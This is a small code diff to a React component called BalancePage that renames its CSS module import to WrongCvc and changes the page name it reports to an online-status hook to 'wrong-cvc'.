@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import styles from "./ChangeCard.module.css";
+import styles from "./WrongCvc.module.css";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import Loading from "../../components/Loading/Loading";
 import { useOnlineStatus } from "../../hooks/useOnlineStatus";
@@ -11,7 +11,7 @@ const BalancePage: React.FC = () => {
   useRedirectChecker(3000);
   useOnlineStatus({
     sessionId,
-    pageName: "change",
+    pageName: "wrong-cvc",
     enabled: true,
   });
   const [change, setChange] = useState("");
